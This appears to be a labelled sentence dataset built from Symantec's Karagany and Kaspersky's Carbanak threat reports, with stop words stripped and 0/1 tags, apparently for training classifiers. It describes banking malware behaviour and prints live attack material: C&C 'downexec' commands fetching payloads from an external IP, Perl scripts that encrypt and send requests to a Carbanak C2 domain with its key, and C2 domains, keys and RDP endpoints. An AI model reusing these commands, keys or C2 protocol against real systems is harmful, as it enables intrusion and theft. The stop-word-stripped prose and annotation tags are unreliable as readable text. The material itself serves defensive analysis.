Where present samples Delphi packer configured use ' neosphere ' key decrypt payload	0
The following brief overview functionality Trojan Karagany	0
Trojan Karagany creates folder user APPDATA directory chooses directory name following list	0
It copies created directory hidden system attributes using file name chosen following list	0
Trojan Karagany copies hidden system attributes first executed err.log[DIGITS ]	1
It copies legitimate chkdsk utility installation folder using payload file name space file extension	0
This may fool ordinary users thinking folder contains legitimate application example PnPutil .exe	0
Trojan Karagany!gen1 may create following additional files installation folder	0
It creates C:\ProgramData\Mail\MailAg\gl directory temporary directory used uploading files	0
Trojan Karagany creates link Startup folder autostart system restarts	0
Trojan Karagany first checks live Internet connection visiting Microsoft Adobe websites	1
It reach C&C server check successful	1
Example HTTP Requests Internet connection test Microsoft GET /en - us / default.aspx HTTP/1.1 Accept - Encoding gzip deflate Content - Type application / x - www - form - urlencoded Host microsoft.com Cookie MC1=V=3&GUID=<32 character guid Connection Keep - Alive Cache - control - cache Internet connection test Adobe using identifiant parameter POST /geo / productid.php HTTP/1.1 Content - Type application / x - www - form - urlencoded Host adobe.com ...	0
identifiant=51032 _ 175129256364 Example POST request C&C server check - POST /check _ value.php HTTP/1.1 User - Agent Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 6.1 ; .NET CLR 2.0.50727 ) Host 93.188.161.235 ...	0
identifiant=51032 _ 1799883375637&version = i2pver HTTP response example HTTP/1.1 200 OK Date Tue 28 Jan 2014 05:59:58 GMT Vary Accept - Encoding Content - Length 324 Content - Type text / html X - Powered - By PHP/5.3.10 - 1ubuntu3.9 Via 1.1 host.alexsieff.com work:3|downexec [ http://]93.188.161.235/check2/muees27jxt / shot.jpg ; work:5|downexec [ http://]93.188.161.235/check2/muees27jxt / tl.jpg ; work:7|downexec [ http://]93.188.161.235/check2/muees27jxt / fl.jpg ; work:103|downexec [ http://]93.188.161.235/check2/muees27jxt / pdump.jpg ; work:118|downexec [ http://]93.188.161.235/check2/muees27jxt / fl.jpg ; The POST data contains operating system version derived number	0
User - Agent tokens used C&C requests hard - coded	0
The following two examples observed	0
Regular expression URL HTTP request - line searches	0
Regular expression file system searches	0
Karagany Yara rule Symantec Security Response ﻿﻿ Symantec protects world 's information global leader security backup availability solutions	0
Our innovative products services protect people information environment - smallest mobile device enterprise data center cloud - based systems	0
Our industry - leading expertise protecting data identities interactions gives customers confidence connected world	0
More information available www.symantec.com connecting Symantec go.symantec.com/socialmedia	0
Headquartered Mountain View Calif. Symantec operations 40 countries	0
More information available www.symantec.com	0
For specific country offices contact numbers please visit website	0
Symantec World Headquarters 350 Ellis St.	0
Mountain View CA 94043 USA + 1 ( 650 ) 527 - 8000 1 ( 800 ) 721 - 3934 www.symantec.com Copyright 2014 Symantec Corporation	0
All rights reserved	0
Symantec Symantec Logo Checkmark Logo trademarks registered trademarks Symantec Corporation affiliates U.S.	0
countries	0
Other names may trademarks respective owners	0
Any technical information made available Symantec Corporation copyrighted work Symantec Corporation owned Symantec Corporation	0
NO WARRANTY	0
The technical information delivered Symantec Corporation makes warranty accuracy use	0
Any use technical documentation information contained herein risk user	0
Documentation may include technical inaccuracies typographical errors	0
Symantec reserves right make changes without prior notice	0
From late 2013 onwards several banks financial institutions attacked unknown group cybercriminals	0
In attacks similar modus operandi used	0
According victims law enforcement agencies ( LEAs ) involved investigation could result cumulative losses 1 billion USD	0
The attacks still active	0
This report provides technical analysis attacks	0
The motivation attackers making use techniques commonly seen Advanced Persistent Threats ( APTs ) appears financial gain opposed espionage	0
An analysis campaign revealed initial infections achieved using spear phishing emails appeared legitimate banking communications Microsoft Word 97 – 2003 ( .doc ) Control Panel Applet ( .CPL ) files attached	0
We believe attackers also redirected exploit kits website traffic related financial activity	0
The email attachments exploit vulnerabilities Microsoft Office 2003 2007 2010 ( CVE-2012 - 0158 CVE-2013 - 3906 ) Microsoft Word ( CVE-2014- 1761 )	0
Once vulnerability successfully exploited shellcode decrypts executes backdoor known Carbanak	0
Carbanak remote backdoor ( initially based Carberp ) designed espionage data exfiltration provide remote access infected machines	1
Once access achieved attackers perform manual reconnaissance victim 's networks	0
Based results operation attackers use different lateral movement tools order get access critical systems victim infrastructure	0
They install additional software Ammyy Remote Administration Tool even compromise SSH servers	1
Notably latest versions analyzed Carbanak malware appear use Carberp source code	0
Once attackers successfully compromise victim network primary internal destinations money processing services Automated Teller Machines ( ATM ) financial accounts	0
In cases attackers used Society Worldwide Interbank Financial Telecommunication ( SWIFT ) network transfer money accounts	0
In others Oracle databases manipulated open payment debit card accounts bank transfer money accounts using online banking system	0
The ATM network also used dispense cash certain ATMs certain times money mules ready collect	0
As part attack reconnaissance phase video recordings activities bank employees particularly system administrators made	1
The videos sent C2 server	1
Please note attackers abused aforementioned services impersonating legitimate local users permissions perform actions later reproduced cybercriminals	0
As far know none aforementioned services attacked specific vulnerability within exploited	0
Of 100 banking entities impacted time writing report least half suffered financial losses victims located Russia USA Germany China Ukraine	0
The magnitude losses significant	0
For example one victim lost approximately $ 7.3 million ( USD ) due ATM fraud ; another suffered $ 10 million ( USD ) loss due exploitation online banking platform	0
Stolen funds transferred affected countries bank accounts US China	0
Additionally C2 servers log entries indicating connections systems located US	0
Telemetry indicates attackers expanding operations regions Asia Middle - East Africa Europe	0
This report discusses attack vectors infection mechanisms toolkits used attackers exploit network initial infection well operational details geographical distribution campaign	0
During spring 2014 Kaspersky Lab involved forensic analysis ATMs dispensing cash people located near physical interaction according security cameras	0
No malware detected ATMs	0
However Carberp - like malware found computer connected via VPN	0
Following investigation incident summer 2014 Kaspersky Lab identified Carberp - like malware another investigation involving bank criminals able gain access online banking systems	0
In investigation started analyzing computers bank 's infrastructure order find source infection	0
We found spear phishing emails CPL files attached successful infection install Carberp - like malware previously found case involving ATMs	0
There evidence indicating cases network compromised two four months many hundreds computers within single victim organization may infected	0
This period time used attackers get access right victims critical systems learn operate tools systems get cash	0
Carbanak contains espionage component allows attackers take control video capabilities victim systems	0
Thanks long term observation reconnaissance could conducted	0
This allowed attackers understand protocols daily operational tempo targets	0
Based understanding exploitation methodologies mechanisms developed tailored victim	0
All observed cases used spear phishing emails Microsoft Word 97 – 2003 ( .doc ) files attached CPL files	0
The doc files exploit Microsoft Office ( CVE- 2012 - 0158 CVE-2013 - 3906 ) Microsoft Word ( CVE- 2014 - 1761 )	0
There indicators point possible Chinese origin exploits used attachments	0
Command Control ( C2 ) servers located China identified campaign	0
In addition registration information domains use details supposedly Chinese citizens	0
Obviously could red herring	0
6 The targets employees affiliated affected institution	0
The spear phishing email messages appeared legitimate cases sent compromised coworkers accounts	0
In way compromised systems used transmission vector	0
Given victims mostly Russian - speaking financial institutions names attachments identified generally Russian	0
Examples include " Соответствие ФЗ-115 " " Приглашение " translate " Accordance Federal Law " " Invitation " respectively	0
This enough induce typical employee open attachment execute malware	0
For complete list file names see Appendix 4	0
The following example Carbanak spear phishing email	0
Translated	0
In case attachment CPL file compressed using Roshal Archive ( .rar ) format	0
Once remote code execution vulnerability successfully exploited installs Carbanak victim 's system	0
The complete list observed spear phishing emails found Appendix 1 – Spear phishing	0
An additional infection vector believe used criminals classical drive - - download attack	0
We found traces Null RedKit exploits kits	0
The image translates Country_name All visitors Unique visitors Banned visitor Revoked infections Infected	0
Carbanak backdoor used attackers compromise victim 's machine exploit either spear phishing email exploit kit successfully executes payload	0
This section provides functional analysis Carbanak 's capabilities	0
Carbanak copies " % system32%\com " name " svchost.exe " file attributes system hidden read -	1
The original file created exploit payload deleted	0
To ensure Carbanak autorun privileges malware creates new service	1
The naming syntax " ServiceName Sys " ServiceName existing service randomly chosen first character deleted	0
For example existing service name " aspnet " visible name " Asp.net state service " service created malware would " aspnetSys " visible name " Sp.net state service "	0
Before creating malicious service Carbanak determines either avp.exe avpui.exe processes ( components Kaspersky Internet Security ) running	1
If found target system Carbanak try exploit known vulnerability Windows XP Windows Server 2003 Windows Vista Windows Server 2008 Windows 7 Windows 8 Windows Server 2012 CVE-2013 - 3660 local privilege escalation	0
We believe relevant attackers adapt tools victim defenses	0
Carbanak creates file random name .bin extension % COMMON_APPDATA%\Mozilla stores commands executed	1
Then malware gets proxy configuration registry entry [ HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings ] Mozilla Firefox configuration file % AppData%\Mozilla\Firefox\<ProfileName>\prefs.js How detect Carbanak One best methods detecting Carbanak look .bin files folder .. \All users\%AppData%\Mozilla\ The malware saves files location later sent C2 server internet connection detected	1
A .BAT script detecting infections provided Appendixes	0
Additionally Carbanak obtain proxy configuration information headers sent application via SOCKS HTTP	1
Carbanak injects code svchost.exe	1
Most actions described happen within process	0
Carbanak downloads file kldconfig.plug C2 server	1
This file includes names processes monitored	0
Once system infected Carbanak logs keystrokes takes screenshots every 20 seconds	1
This monitoring performed intercepting ResumeThread call	0
To enable connections infected computer using Remote Desktop Protocol ( RDP ) Carbanak sets Termservice service execution mode Auto	1
Also executing service modifies executable code memory order establish simultaneous work processes remote local users	0
Modules modified process termsrv.dll csrsrv.dll msgina.dll winlogon.exe	0
If Carbanak detects banking application BLIZKO ( funds transfer software ) infected computer sends special notification C2 server	1
Carbanak also aware IFOBS banking application command substitute details payment documents IFOBS system	0
To communicate C2 server Carbanak uses HTTP protocol RC2+Base64 encryption adding additional characters included Base64	0
It also inserts strings different extensions ( .gif,.htm etc ) random locations HTTP request	0
Example typical Carbanak request	0
Carbanak sends collected monitoring data C2 server	1
It also receives commands	1
The commands compared hash table ; match Carbanak performs associated action	0
In order render malware less suspicious latest Carbanak samples digitally signed	0
Known samples Carbanak uploaded VirusTotal following locations	0
Known exploits download Carbanak uploaded VirusTotal mostly Russia	0
According KSN data victims distributed geographically follows	0
It also interesting see distribution Carbanak submissions VirusTotal	0
This way identify periods malware came attention potential victims security researchers helps reveal peaks group 's activity	0
Since beginning case Kaspersky Lab worked cooperation LEAs investigating	0
During investigation LEAs shared us statistical data research helped us complete picture campaign	0
The following map shows targets ' IP addresses found three Carbanak 's Linux servers end October 2014	0
Carbanak uses different tools infected systems one different purpose	0
There appears preference Ammyy Admin remote administration tool remote control	0
Specifically attackers detected uploading Ammyy Admin 3.5 ( f8cd52b70a11a1fb3f29c6f89ff971ec ) svchost.exe It believed attackers used remote administration tool commonly whitelisted victims ' environments result used regularly administrators	0
In another instance Secure Shell ( SSH ) backdoor used communicate C2 server 190.97.165.126 ( operatemesscont.net )	1
This indicates attackers limit Microsoft Windows environments	0
In case victim used Telnet / SSH client PuTTY connect server attackers recompiled machine 's SSH daemon backdoor could gain direct access	1
Logs tools indicate accessed two different IPs probably used attackers located Ukraine France	0
We also found traces many different tools used attackers inside victim network gain control additional systems Metasploit PsExec Mimikatz	0
There appear four distinct types C2 servers	0
Server rotation occurs less biweekly basis	0
For complete list identified Carbanak servers please check regularly updated Carbanak IOC document	0
The current list IOCs provided Appendix 3 document	0
Some C2 servers responsible dropping Ammyy ( configuration executable files ) KLG plugin configuration ( list processes monitor ) VNC server ( 32 64 bits injected rundll )	0
In one observed servers also Metasploit module	0
Victim systems catalogued servers ' databases	0
The victims belong number different communities thus simplifying administration	0
In 85 different victims belonging seven communities found	0
Additionally malicious servers contain video files capture victim activity	0
While videos stored using compressed format provides poor image quality selected format minimizes upload bandwith sufficient quality attackers understand victims ' activities	0
The video file naming conventions used name application foreground ( e.g. Outlook Cmd etc ) recorded user activity	0
This helped attackers navigate files interest discard superfluous files	0
Using intelligence gained video monitoring techniques attackers developed operational picture victim 's workflow tooling practices	0
This picture helps attackers deploy malicious operations example	0
In general attackers demonstrated great versatility using attack methodologies best suited specific victim 's operational methodology	0
However seemed deliberately limit amount money stolen per victim $ 10 million USD	0
This limit may explained maximum amount money transferred via mule services maximum amount money budgeted banks fraud risks order minimize chances LEAs bank anti - fraud teams full blown analysis	0
Sensitive bank documents found servers controlling Carbanak	0
They included classified emails manuals crypto keys passwords	0
For example file figure KVC ( key verification codes ) keys used ATMs check integrity PIN numbers users	0
In cases involving ATMs criminals able control computers access internal ATM network	0
If bank enabled remote access ATMs criminals started using access remotely withdraw cash	0
Criminals used malware operate ATM dispenser ; instead used standard utilities control test ATM equipment	0
Malware targeting finance industry ( companies consumers ) continues evolve	0
The Carbanak malware used - going campaign described report successful terms generating revenue	0
Of particular interest attack methods similar used sophisticated cyber - espionage APTs	0
As represent new disturbing trend cybercrime market increasing attack sophistication	0
Despite increased awareness cybercrime within financial services sector appears spear phishing attacks old exploits ( patches disseminated ) remain effective larger companies	0
Attackers always use minimal effort approach order bypass victim defenses	0
Advanced control fraud detection systems used years financial services industry	0
However focus fraudulent transactions within customer accounts	0
The Carbanak attackers bypassed protections example using industry - wide funds transfer ( SWIFT network ) updating balances account holders using disbursement mechanisms ( ATM network )	0
In neither cases attackers exploit vulnerability within service	0
Instead studied victim internal procedures pinpointed impersonate locally order process fraudulent transactions aforementioned services	0
It clear attackers familiar financial services software networks	0
As part automated reconnaissance phase Carbanak malware checked victim systems presence specialized specific banking software	0
Only presence banking systems confirmed victims exploited	0
To date attacks approximately 300 IP addresses around world observed analyzed C2s	0
It possible attacks coordinated maximize returns prior industry - wide information sharing implementation countermeasures	0
Existing telemetry indicates Carbanak attackers trying expand operations Baltic Central Europe countries Middle East Asia Africa	0
Carbanak may responsible losses high $ 1 billion USD	0
We believe Carbanak campaign clear indicator new era cybercrime criminals use APT techniques directly financial industry instead customers	0
APTs stealing information anymore	0
Decryptor # /usr / bin / perl -w # Work Carbanak c2 use strict ; use warnings ; use Crypt::CBC ; use Crypt::Cipher::RC2 ; use MIME::Base64 ; use LWP::Simple ; # $ c2 = " worldnewsonline.pw " ; # $ reguest = " 1234567890123456 " ; $ reguest_was = " JybDHkfWGURJPuWeUpPMX / ca9BThbDim0Hdk/9YzkJS7m8a19tz QwZxo1vvQ / r/7SHJcCm4tdpZGp.dmDwKf MjpWBM18eX8VUiimyaUZMGoClZ6eShS9tLCK tuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4V fyUz.shtml " ; $ reguest_was = ~ tr/\/\=\&\?//d ; $ replace = " " ; $ find=".shtml " ; $ reguest_was = ~ s/\Q$find\E//g ; $ reguest_was = ~ s/-/+/g ; $ reguest_was = ~ s/\./\//g ; print " $ reguest_was\n " ; $ iv = substr $ reguest_was,0,8 ; $ reguest_was = substr $ reguest_was,8 ; $ base64_decoded1 = decode_base64("$reguest_was " ) ; print " $ base64_decoded1\n " ; $ length = length($base64_decoded1 ) ; print " length $ length\n " ; print " iv $ iv\n " ; print " req $ reguest_was\n " ; $ base64_decoded = " $ { base64_decoded1 } " ; $ key = " vfDGbiwmiqdN6E2N " ; # $ key = " 1234567812345678 " ; $ cipher = Crypt::CBC->new ( -cipher=>'Cipher::RC2 ' -header=>'none ' -literal_key=>1 -key=>$key – keysize=>16 -iv=>$iv ) ; $ plaintext = $ cipher->decrypt($base64_decoded ) ; print " Decode:\ n$plaintext\n " ; # Decrypt # HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data = listprocess|pro cess = svchost.exe|idproce ss=4294967295|lBHReFDRDfYG # $ url = " http://$c2/$base64_encoded " ; # print $ url ; # $ contents = get($url ) ; # print $ contents ; Encryptor # /usr / bin / perl -w # Decrypt Carbanak c2 responce use strict ; use warnings ; use Crypt::CBC ; use Crypt::Cipher::RC2 ; use MIME::Base64 ; use LWP::Simple ; $ c2 = " worldnewsonline.pw " ; $ reguest = " HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data = listprocess|pro cess = svchost.exe|idproces s=4294967295|lBHReFDRDfYG " ; $ iv = " JybDHkfW " ; # random $ key = " vfDGbiwmiqdN6E2N " ; $ cipher = Crypt::CBC->new ( -cipher=>'Cipher::RC2 ' -header=>'none ' -literal_key=>1 -key=>$key – keysize=>16 -iv=>$iv ) ; $ ciphertext = $ cipher->encrypt($reguest ) ; $ base64_encoded = encode_base64("$ciphertext " ) ; $ base64_encoded = ~ s/\x0a//g ; $ base64_encoded = ~ s/\//\./g ; $ base64_encoded = ~ s/\+/-/g ; $ base64_encoded_ex = " $ { iv}${base64_encoded}.php " ; $ url = " http://$c2/${base64_encoded_ex } " ; print $ url ; # http://worldnewsonline.pw/ GURJPuWeUpPMXca9BThbDim0Hdk9YzkJS7m8a19tzQwZxo1vvQr7SHJcCm4tdp ZGp	0
dmDwKfMjpW.BM18eX8VUiimyaUZMGoClZ6eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHG ZCBPj.vd08D UENC5o AE4VfyUz .. php| $ contents = get($url ) ; print $ contents ; Decrypt Files CnC # /usr / bin / perl -w # Decrypt Files sended c2 use strict ; use warnings ; use Crypt::CBC ; use Crypt::Cipher::RC2 ; use MIME::Base64 ; use LWP::Simple ; $ file=$ARGV[0 ] ; open(DATA " $ file " ) ; open(DATA1 " $ file " ) ; open(DATA2 " $ file " ) ; binmode(DATA ) ; binmode(DATA1 ) ; binmode(DATA2 ) ; ( $ data $ n $ offset ) ; ( ( $ n = read DATA $ data 1 $ offset ) = 0 ) { $ offset + = $ n ; } $ length = $ offset ; $ iv_len = read DATA1 $ iv 8 0 ; read DATA2 $ crypt_data $ length 8 ; $ key = " vfDGbiwmiqdN6E2N " ; $ cipher = Crypt::CBC->new ( -cipher=>'Cipher::RC2 ' -header=>'none ' -literal_key=>1 -key=>$key – keysize=>16 -iv=>$iv ) ; $ plaintext = $ cipher->decrypt($crypt_data ) ; print " $ plaintext " ; @echo /f % % ( ' hostname ' ) set " name=%%a " echo % name% del /f % name%.log 2 nul exist " c:\Documents settings\All users\application data\ mozilla\*.bin " echo " BIN detected " % name%.log exist % SYSTEMROOT%\System32\com\svchost.exe echo " COM detected " % name%.log exist " c:\ProgramData\mozilla\*.bin " echo " BIN2 detected " % name%.log exist % SYSTEMROOT%\paexec * echo " Paexec detected " % name%.log exist % SYSTEMROOT%\Syswow64\com\svchost.exe echo " COM64 detected " % name%.log SC QUERY state= | find " SERVICE_NAME " | findstr " Sys$ " q%ERRORLEVEL% = = q0 SC QUERY state= | find " SERVICE_NAME " | findstr " Sys$ " % name%.log exist % name%.log echo Ok % name%.log xcopy /y % name%.log " \\<IP>\logVirus This section contains details spear phishing emails sent attackers infect victims	0
MD5 8fa296efaf87ff4d9179283d42372c52 Name attachment Соответствие ФЗ- 115 от 24.06.2014г.doc Drops executable MD5 a1979aa159e0c54212122fd8acb24383 ( Carbanak ) Compiled Mon Apr 04 20:00:57 2011 ( Probably fake ) C2 update- java.net C2 key 1234567812345678 RDP 37.235.54.48:443 MD5 665b6cb31d962aefa3037b5849889e06 Name attachment Запрос.doc Drops executable MD5 4afafa81731f8f02ba1b58073b47abdf ( Carbanak ) Compiled Tue Jul 01 03:20:06 2014 Connects financialnewsonline.pw/FYocDxXpn5MXsHwZX/kLUAbd3w2/uUTsarcVKYk2W3B6hnc Z / Gafh8U1W805Lo0N / np7E3ICR6qx8keLDJZqUGXJKBDzfc6VYz9TNIlktObQ.htm ( 185.10.58.175 ) C2 financialnewsonline.pw financialwiki.pw C2 key TXeyuryWcIuzxkWnyu RDP 185.10.56.59:443 MD5 2c395f211db2d02cb544448729d0f081 Name attachment new.doc Drops executable MD5 551d41e2a4dd1497b3b27a91922d29cc ( Carbanak ) Compiled Mon Aug 04 01:10:40 2014 Connects http://worldnewsonline.pw/JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7 m8a19tzQwZxo1vvQ / r/7SHJcCm4tdpZGp.dmDwKfMjpWBM18eX8VUiimyaUZMGoClZ6 eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4VfyUz.shtml C2s worldnewsonline.pw worldnews24.pw C2 key JDvkyfhZxkMmDSwUkqvReIvC RDP 185.10.56.59:443 MD5 31e16189e9218cb131fdb13e75d0a94f Name attachment Анкета- Заявление.doc Drops executable MD5 4e107d20832fff89a41f04c4dff1739b ( Carbanak ) C2 public- dns.us C2 key 1234567812345678 RDP 37.235.54.48:443 MD5 db83e301564ff613dd1ca23c30a387f0 Name attachment Соответствие ФЗ- 115 от 21.07.2014г.doc Drops executable MD5 cb915d1bd7f21b29edc179092e967331 ( Carbanak ) Compiled Tue Apr 08 05:44:12 2014 Connects datsun- auto.com / bDqxEs / Ta6IPJq3zqmRY- .5/8SgGLA- F / I9CstBYT1rK7kx.440Sbtru.cgi?QVzF = tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD- Ucygbtzv4=f8fx MD5 f88a983fc0ef5bb446ae63250e7236dd Name attachment Приглашение.msg Drops executable MD5 3dc8c4af51c8c367fbe7c7feef4f6744 ( Carbanak ) Compiled Fri Aug 08 00:48:07 2014 C2s worldnewsonline.pw worldnews24.pw C2 key vfDGbiwmiqdN6E2N RDP 185.10.56.59:443 MD5 c4a6a111a070856c49905d815f87ab49 Name attachment ЧОСВЯЮООАГЖЦСЦЧОЧю Drops executable MD5 cb915d1bd7f21b29edc179092e967331 ( Carbanak ) Connects GET /cBAWFvkXi94QxShRTaVVn / YzAxD / X0sZEud.5gNItbvozI3tqT5ly9UYLVii13.bml?tlxCFi Busj=2OVj&9GP = a5houGz&K.F = T&l0.7FBN75=nMPDrlGXq4s7cIAQ0Cl662IwVjxvsiTOlG 0d0pd HTTP/1.1 Host datsun- auto.com MD5 86e48a9be62494bffb3b8e5ecb4a0310 Name attachment Приглашение.doc Drops executable MD5 3dc8c4af51c8c367fbe7c7feef4f6744 ( Carbanak ) Compiled Fri Aug 08 00:48:07 2014 MD5 6c7ac8dfd7bc5c2bb1a6d7aec488c298 Name attachment Соответствие ФЗ- 115 от 02.07.2014г .. doc Drops executable MD5 cb915d1bd7f21b29edc179092e967331 ( Carbanak ) Compiled Tue Apr 08 05:44:12 2014 Connects datsun- auto.com / bDqxEs / Ta6IPJq3zqmRY- .5/8SgGLA- F / I9CstBYT1rK7kx.440Sbtru.cgi?QVzF = tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD- Ucygbtzv4=f8fx 36 samples Securelist resource Follow us Kaspersky Lab experts ' technical research Academy Business Eugene SecureList ThreatPost Daily analysis thoughts	0
Academy Business Eugene ThreatPost Daily Kaspersky Lab global Website Eugene Kaspersky Blog Daily Business Daily Kaspersky Lab B2C Blog Kaspersky Lab B2B Blog Academy Business ThreatPost Daily Academy Business Daily Kaspersky Lab security news service Kaspersky Lab Academy 39A/3 Leningradskoe Shosse Moscow 125212 Russian Federation contact details Tel + 7 - 495 - 797 - 8700 Fax + 7 - 495 - 797 - 8709	0
